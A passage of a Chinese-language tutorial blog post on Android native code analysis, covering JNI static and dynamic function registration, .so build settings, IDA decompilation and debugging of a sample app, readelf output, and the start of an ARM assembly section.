class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Used to load the 'native-lib' library on application startup.</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"native-lib"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Native-函数注册"><a href="#Native-函数注册" class="headerlink" title="Native 函数注册"></a>Native 函数注册</h2><h3 id="静态注册"><a href="#静态注册" class="headerlink" title="静态注册"></a>静态注册</h3><p>静态注册的理解和使用方式简单，出错率低。但必须遵循注册规则，当需要更改类名、包名或者方法时，需要按照之前方法重新生成头文件，灵活性不高。</p><p>Java 文件中的 Native 声明：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">sayHello</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>静态注册在 cpp 文件中通过 JNIEXPORT 和 JNICALL 两个宏定义声明，在虚拟机加载 so 时发现上面两个宏定义的函数时就会链接到对应的 native 方法。so 中的名字为类名 + 函数名的组合，并且自带两个参数，即 <code>JNIEnv* env</code> 和 <code>jclass</code>（static 方法时）/<code>jobject</code>（普通方法时）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"log.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</span><br><span class="line">JNIEXPORT jstring JNICALL</span><br><span class="line">Java_com_assassinq_easycpp_MainActivity_sayHello(JNIEnv *env, jobject obj) &#123;</span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(<span class="string">"Hello World"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>静态注册有一些缺点：</p><ol><li>Native 函数名称特别长，不利于书写；</li><li>每次新增或删除接口时需要重新生成文件，比较繁琐；</li><li>第一次调用时需要根据函数名建立索引，影响效率；</li><li>JNI 层的函数名是由 Java 接口名生成，很容易通过 hook 调用动态库中的函数。</li></ol><h3 id="动态注册"><a href="#动态注册" class="headerlink" title="动态注册"></a>动态注册</h3><p>动态注册在 JNI 层通过重载 <code>JNI_OnLoad()</code> 函数来实现，系统初始化 JNI 在加载时，会调用 <code>JNI_OnLoad()</code>，而卸载时会调用 <code>JNI_UnLoad()</code>。原理是通过自定义方法把 C/C++ 函数映射到 JAVA 定义的方法，不需要通过 JAVA 方法名查找匹配 Native 函数名，也就不需要遵循静态注册的命名规则。</p><p>cpp 文件中的函数定义如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jstring <span class="title">sayHi</span><span class="params">(JNIEnv *env, jobject obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(<span class="string">"Hi World"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过内置函数 <code>RegisterNatives()</code> 实现自定义的注册方法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">registerNativeMethods</span><span class="params">(JNIEnv *env, <span class="keyword">const</span> <span class="keyword">char</span> *className, JNINativeMethod *gMethods, <span class="keyword">int</span> numMethods)</span> </span>&#123;</span><br><span class="line">    jclass clazz;</span><br><span class="line">    clazz = env-&gt;FindClass(className);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (env-&gt;RegisterNatives(clazz, gMethods, numMethods) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> JNI_TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义 gClassName 和 gMethods 两个变量，分别表示需要查找的类名和需要注册的方法信息：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *gClassName = <span class="string">"com/assassinq/easycpp/MainActivity"</span>;</span><br><span class="line"><span class="keyword">static</span> JNINativeMethod gMethods[] = &#123;</span><br><span class="line">        &#123;<span class="string">"sayHi"</span>, <span class="string">"()Ljava/lang/String;"</span>, (<span class="keyword">void</span> *) sayHi&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中方法信息的结构体如下，第一个变量为方法名，第二个变量为方法签名（字符串类型，以 Smali 代码的方式），第三个变量为对应的函数指针：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* name; <span class="comment">// native 的方法名</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* signature; <span class="comment">// 方法签名，例如 ()Ljava/lang/String;</span></span><br><span class="line">    <span class="keyword">void</span>*       fnPtr; <span class="comment">// 函数指针</span></span><br><span class="line">&#125; JNINativeMethod;</span><br></pre></td></tr></table></figure><p>最后重写 <code>JNI_OnLoad()</code> 函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">JNIEXPORT jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM *vm, <span class="keyword">void</span> *reserved)</span> </span>&#123;</span><br><span class="line">    JNIEnv *env = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (vm-&gt;GetEnv((<span class="keyword">void</span> **)&amp;env, JNI_VERSION_1_6) != JNI_OK) &#123;</span><br><span class="line">        LOGE(<span class="string">"This jni version is not supported"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (registerNativeMethods(env, gClassName, gMethods, <span class="keyword">sizeof</span>(gMethods) / <span class="keyword">sizeof</span>(gMethods[<span class="number">0</span>])) == JNI_FALSE) &#123;</span><br><span class="line">        LOGE(<span class="string">"Unable to register native methods"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    LOGE(<span class="string">"Methods loaded successfully"</span>);</span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="so-动态链接库"><a href="#so-动态链接库" class="headerlink" title="so 动态链接库"></a>so 动态链接库</h2><p>在编译过程中，可以修改 app 目录下的 build.gradle 中的内容，使用 android.defaultConfig.ndk.abiFilters 来指示 Gradle 要构建和打包的 ABI 版本，生成不同架构下的动态链接库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">    ...</span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        ...</span><br><span class="line">        ndk &#123;</span><br><span class="line">            abiFilters &quot;armeabi-v7a&quot;, &quot;arm64-v8a&quot;, &quot;x86&quot;, &quot;x86_64&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>so 文件一般存放在 apk 的 lib 目录下（NDK r17 版本开始已经去掉了 armeabi、mips、mips64 的 ABI 支持）：</p><ul><li>armeabi-v7a：第 7 代及以上的 ARM 处理器。2011 年 15 月以后的生产的大部分 Android 设备都使用它。</li><li>arm64-v8a：第 8 代、64 位 ARM 处理器，很少设备，三星 Galaxy S6 是其中之一。</li><li>armabi：第 5 代、第 6 代的 ARM 处理器，早期的手机用的比较多。</li><li>x86：Intel x86（平板、模拟器用得比较多）。</li><li>x86_64：Intel x64（64 位的平板）。</li><li>…</li></ul><h2 id="IDA-反编译-so-文件"><a href="#IDA-反编译-so-文件" class="headerlink" title="IDA 反编译 so 文件"></a>IDA 反编译 so 文件</h2><p>用 IDA 打开编译后的 apk，可以看到 lib 中存在一个 libnative-lib.so：</p><p><img src="/pics/Android逆向入门/二/2.png" alt="拖进IDA"></p><p>查看静态注册函数的反编译结果：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">Java_com_assassinq_easycpp_MainActivity_sayHello</span><span class="params">(_JNIEnv *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> _JNIEnv::NewStringUTF(a1, <span class="string">"Hello World"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看动态注册的函数的反编译结果：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">sayHi</span><span class="params">(_JNIEnv *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> _JNIEnv::NewStringUTF(a1, <span class="string">"Hi World"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="IDA-动态调试-apk"><a href="#IDA-动态调试-apk" class="headerlink" title="IDA 动态调试 apk"></a>IDA 动态调试 apk</h1><ol><li>安装 apk 到手机：<code>adb install example.apk</code></li><li>将 IDA 目录下的调试文件 push 到手机上：<code>adb push android_server /data/local/tmp</code></li><li>赋给程序可执行权限：<code>chmod 777 android_server</code></li><li>启动调试服务端：<code>./android_server</code> （自定义设置端口方式：<code>-p23333</code>）</li><li>手机端端口转发至电脑端：<code>adb forward tcp:[pc_port] tcp:[mobile_port]</code></li><li>IDA 调试端口设置：Debugger-&gt;Process option</li><li>启动程序：<code>adb shell am start -D -n packageName/activityName</code></li><li>IDA 挂接到 Native 层：Debugger-&gt;Attach to process…</li><li>打开 monitor，监听并挂接到 JAVA 层：<code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</code></li></ol><p><img src="/pics/Android逆向入门/二/3.png" alt="成功调试JNI的界面"></p><h1 id="动态链接库文件（-so-文件）"><a href="#动态链接库文件（-so-文件）" class="headerlink" title="动态链接库文件（.so 文件）"></a>动态链接库文件（.so 文件）</h1><p>加载顺序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">init_array -&gt; JNI_OnLoad -&gt; ... -&gt; fini_array</span><br></pre></td></tr></table></figure><h2 id="so-文件查看工具"><a href="#so-文件查看工具" class="headerlink" title="so 文件查看工具"></a>so 文件查看工具</h2><h3 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h3><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>-a</code></td><td style="text-align:center">显示 so 文件的所有信息</td></tr><tr><td style="text-align:center"><code>-h</code></td><td style="text-align:center">显示 ELF 文件头</td></tr><tr><td style="text-align:center"><code>-l</code></td><td style="text-align:center">显示 Program Headers，动态加载时需要的信息</td></tr><tr><td style="text-align:center"><code>-S</code></td><td style="text-align:center">显示 Section Headers，静态加载分析时需要的信息</td></tr><tr><td style="text-align:center"><code>-e</code></td><td style="text-align:center">显示 ELF Header、Section Headers、Program Headers 信息</td></tr><tr><td style="text-align:center"><code>-s</code></td><td style="text-align:center">显示符号表（Symbol Table）</td></tr><tr><td style="text-align:center"><code>-d</code></td><td style="text-align:center">显示动态节区（Dynamic Section）</td></tr></tbody></table><p>显示 ELF 文件头：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -h libnative-lib.so</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00</span><br><span class="line">  Class:                             ELF32</span><br><span class="line">  Data:                              2<span class="string">'s complement, little endian</span></span><br><span class="line"><span class="string">  Version:                           1 (current)</span></span><br><span class="line"><span class="string">  OS/ABI:                            UNIX - System V</span></span><br><span class="line"><span class="string">  ABI Version:                       0</span></span><br><span class="line"><span class="string">  Type:                              DYN (Shared object file)</span></span><br><span class="line"><span class="string">  Machine:                           ARM</span></span><br><span class="line"><span class="string">  Version:                           0x1</span></span><br><span class="line"><span class="string">  Entry point address:               0x0</span></span><br><span class="line"><span class="string">  Start of program headers:          52 (bytes into file)</span></span><br><span class="line"><span class="string">  Start of section headers:          12932 (bytes into file)</span></span><br><span class="line"><span class="string">  Flags:                             0x5000200, Version5 EABI, soft-float ABI</span></span><br><span class="line"><span class="string">  Size of this header:               52 (bytes)</span></span><br><span class="line"><span class="string">  Size of program headers:           32 (bytes)</span></span><br><span class="line"><span class="string">  Number of program headers:         8</span></span><br><span class="line"><span class="string">  Size of section headers:           40 (bytes)</span></span><br><span class="line"><span class="string">  Number of section headers:         27</span></span><br><span class="line"><span class="string">  Section header string table index: 26</span></span><br></pre></td></tr></table></figure><p>显示 Program headers：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -l libnative-lib.so</span><br><span class="line"></span><br><span class="line">Elf file <span class="built_in">type</span> is DYN (Shared object file)</span><br><span class="line">Entry point 0x0</span><br><span class="line">There are 8 program headers, starting at offset 52</span><br><span class="line"></span><br><span class="line">Program Headers:</span><br><span class="line">  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align</span><br><span class="line">  PHDR           0x000034 0x00000034 0x00000034 0x00100 0x00100 R   0x4</span><br><span class="line">  LOAD           0x000000 0x00000000 0x00000000 0x02ab6 0x02ab6 R E 0x1000</span><br><span class="line">  LOAD           0x002e3c 0x00003e3c 0x00003e3c 0x001dc 0x001dd RW  0x1000</span><br><span class="line">  DYNAMIC        0x002e8c 0x00003e8c 0x00003e8c 0x00110 0x00110 RW  0x4</span><br><span class="line">  NOTE           0x000134 0x00000134 0x00000134 0x000bc 0x000bc R   0x4</span><br><span class="line">  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10</span><br><span class="line">  EXIDX          0x0021f4 0x000021f4 0x000021f4 0x001b8 0x001b8 R   0x4</span><br><span class="line">  GNU_RELRO      0x002e3c 0x00003e3c 0x00003e3c 0x001c4 0x001c4 RW  0x4</span><br><span class="line"></span><br><span class="line"> Section to Segment mapping:</span><br><span class="line">  Segment Sections...</span><br><span class="line">   00</span><br><span class="line">   01     .note.android.ident .note.gnu.build-id .dynsym .dynstr .gnu.hash .<span class="built_in">hash</span> .gnu.version .gnu.version_d .gnu.version_r .rel.dyn .rel.plt .plt .text .ARM.exidx .ARM.extab .rodata</span><br><span class="line">   02     .fini_array .data.rel.ro .dynamic .got .data .bss</span><br><span class="line">   03     .dynamic</span><br><span class="line">   04     .note.android.ident .note.gnu.build-id</span><br><span class="line">   05</span><br><span class="line">   06     .ARM.exidx</span><br><span class="line">   07     .fini_array .data.rel.ro .dynamic .got</span><br></pre></td></tr></table></figure><p>显示 Section headers：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -S libnative-lib.so</span><br><span class="line">There are 27 section headers, starting at offset 0x3284:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .note.android.ide NOTE            00000134 000134 000098 00   A  0   0  4</span><br><span class="line">  [ 2] .note.gnu.build-i NOTE            000001cc 0001cc 000024 00   A  0   0  4</span><br><span class="line">  [ 3] .dynsym           DYNSYM          000001f0 0001f0 000190 10   A  4   1  4</span><br><span class="line">  [ 4] .dynstr           STRTAB          00000380 000380 0001d3 00   A  0   0  1</span><br><span class="line">  [ 5] .gnu.hash         GNU_HASH        00000554 000554 00004c 04   A  3   0  4</span><br><span class="line">  [ 6] .<span class="built_in">hash</span>             HASH            000005a0 0005a0 0000b0 04   A  3   0  4</span><br><span class="line">  [ 7] .gnu.version      VERSYM          00000650 000650 000032 02   A  3   0  2</span><br><span class="line">  [ 8] .gnu.version_d    VERDEF          00000684 000684 00001c 00   A  4   1  4</span><br><span class="line">  [ 9] .gnu.version_r    VERNEED         000006a0 0006a0 000040 00   A  4   2  4</span><br><span class="line">  [10] .rel.dyn          REL             000006e0 0006e0 0000e8 08   A  3   0  4</span><br><span class="line">  [11] .rel.plt          REL             000007c8 0007c8 000088 08  AI  3  20  4</span><br><span class="line">  [12] .plt              PROGBITS        00000850 000850 0000e0 00  AX  0   0  4</span><br><span class="line">  [13] .text             PROGBITS        00000930 000930 0018c4 00  AX  0   0  4</span><br><span class="line">  [14] .ARM.exidx        ARM_EXIDX       000021f4 0021f4 0001b8 08  AL 13   0  4</span><br><span class="line">  [15] .ARM.extab        PROGBITS        000023ac 0023ac 0001a4 00   A  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        00002550 002550 000566 01 AMS  0   0  1</span><br><span class="line">  [17] .fini_array       FINI_ARRAY      00003e3c 002e3c 000008 04  WA  0   0  4</span><br><span class="line">  [18] .data.rel.ro      PROGBITS        00003e44 002e44 000048 00  WA  0   0  4</span><br><span class="line">  [19] .dynamic          DYNAMIC         00003e8c 002e8c 000110 08  WA  4   0  4</span><br><span class="line">  [20] .got              PROGBITS        00003f9c 002f9c 000064 00  WA  0   0  4</span><br><span class="line">  [21] .data             PROGBITS        00004000 003000 000018 00  WA  0   0  4</span><br><span class="line">  [22] .bss              NOBITS          00004018 003018 000001 00  WA  0   0  1</span><br><span class="line">  [23] .comment          PROGBITS        00000000 003018 000109 01  MS  0   0  1</span><br><span class="line">  [24] .note.gnu.gold-ve NOTE            00000000 003124 00001c 00      0   0  4</span><br><span class="line">  [25] .ARM.attributes   ARM_ATTRIBUTES  00000000 003140 000034 00      0   0  1</span><br><span class="line">  [26] .shstrtab         STRTAB          00000000 003174 00010f 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure><p>显示符号表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -s libnative-lib.so</span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">'.dynsym'</span> contains 25 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND __cxa_atexit@LIBC (2)</span><br><span class="line">     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND __cxa_finalize@LIBC (2)</span><br><span class="line">     3: 00000000     0 OBJECT  GLOBAL DEFAULT  UND __stack_chk_guard@LIBC (2)</span><br><span class="line">     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND __stack_chk_fail@LIBC (2)</span><br><span class="line">     5: 00000000     0 FUNC    GLOBAL DEFAULT  UND __android_log_print</span><br><span class="line">     6: 00000000     0 OBJECT  GLOBAL DEFAULT  UND __sF@LIBC (2)</span><br><span class="line">     7: 00000000     0 FUNC    GLOBAL DEFAULT  UND abort@LIBC (2)</span><br><span class="line">     8: 00000000     0 FUNC    GLOBAL DEFAULT  UND fflush@LIBC (2)</span><br><span class="line">     9: 00000000     0 FUNC    GLOBAL DEFAULT  UND fprintf@LIBC (2)</span><br><span class="line">    10: 00000000     0 FUNC    GLOBAL DEFAULT  UND dladdr@LIBC (3)</span><br><span class="line">    11: 00000000     0 FUNC    GLOBAL DEFAULT  UND __aeabi_memclr8</span><br><span class="line">    12: 00000000     0 FUNC    GLOBAL DEFAULT  UND __aeabi_memcpy</span><br><span class="line">    13: 00000000     0 FUNC    GLOBAL DEFAULT  UND __gnu_Unwind_Find_exidx</span><br><span class="line">    14: 00000000     0 FUNC    GLOBAL DEFAULT  UND snprintf@LIBC (2)</span><br><span class="line">    15: 00004018     0 NOTYPE  GLOBAL DEFAULT  ABS _edata</span><br><span class="line">    16: 00004019     0 NOTYPE  GLOBAL DEFAULT  ABS _end</span><br><span class="line">    17: 00000975    36 FUNC    GLOBAL DEFAULT   13 Java_com_assassinq_easycp</span><br><span class="line">    18: 00000999    44 FUNC    WEAK   DEFAULT   13 _ZN7_JNIEnv12NewStringUTF</span><br><span class="line">    19: 00000b87    72 FUNC    WEAK   DEFAULT   13 _ZN7_JNIEnv15RegisterNati</span><br><span class="line">    20: 00000b5d    42 FUNC    WEAK   DEFAULT   13 _ZN7_JNIEnv9FindClassEPKc</span><br><span class="line">    21: 00004018     0 NOTYPE  GLOBAL DEFAULT  ABS __bss_start</span><br><span class="line">    22: 000009e9   224 FUNC    GLOBAL DEFAULT   13 JNI_OnLoad</span><br><span class="line">    23: 00000ac9    52 FUNC    WEAK   DEFAULT   13 _ZN7_JavaVM6GetEnvEPPvi</span><br><span class="line">    24: 000009c5    36 FUNC    GLOBAL DEFAULT   13 sayHi</span><br></pre></td></tr></table></figure><p>显示 Dynamic Section：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -d libnative-lib.so</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0x2e8c contains 29 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x3fb0</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   136 (bytes)</span><br><span class="line"> 0x00000017 (JMPREL)                     0x7c8</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000011 (REL)                        0x6e0</span><br><span class="line"> 0x00000012 (RELSZ)                      232 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffa (RELCOUNT)                   26</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x1f0</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000005 (STRTAB)                     0x380</span><br><span class="line"> 0x0000000a (STRSZ)                      467 (bytes)</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x554</span><br><span class="line"> 0x00000004 (HASH)                       0x5a0</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [liblog.so]</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libm.so]</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libdl.so]</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so]</span><br><span class="line"> 0x0000000e (SONAME)                     Library soname: [libnative-lib.so]</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x3e3c</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               8 (bytes)</span><br><span class="line"> 0x0000001e (FLAGS)                      BIND_NOW</span><br><span class="line"> 0x6ffffffb (FLAGS_1)                    Flags: NOW</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x650</span><br><span class="line"> 0x6ffffffc (VERDEF)                     0x684</span><br><span class="line"> 0x6ffffffd (VERDEFNUM)                  1</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x6a0</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 2</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure><h3 id="SO-Helper"><a href="#SO-Helper" class="headerlink" title="SO Helper"></a>SO Helper</h3><p>无名侠大佬开发的软件。可以用来快速地获取 so 文件的一些基本信息，提供较弱的汇编功能。</p><h1 id="ARM-汇编代码"><a href="#ARM-汇编代码" class="headerlink" title="ARM 汇编代码"></a>ARM 汇编代码</h1><p>ARM 是 ARM 公司的 32 位处理器，其汇编指令的机器码就是 32 位。</p><ol><li>ARM 汇编语言是一门“低级”语言可以和系统的底层相互沟通；</li><li>ARM 汇编语言编写的程序运行速度快，占用内存少；</li><li>ARM 编写的代码难懂，难以维护；</li><li>C 语言能实现的 ARM 汇编语言都能实现；</li><li>ARM 具有 31 个通用寄存器，6 个状态寄存器；</li><li>ARM 处理器支持 7 种运行模式。<ol><li>用户模式：ARM 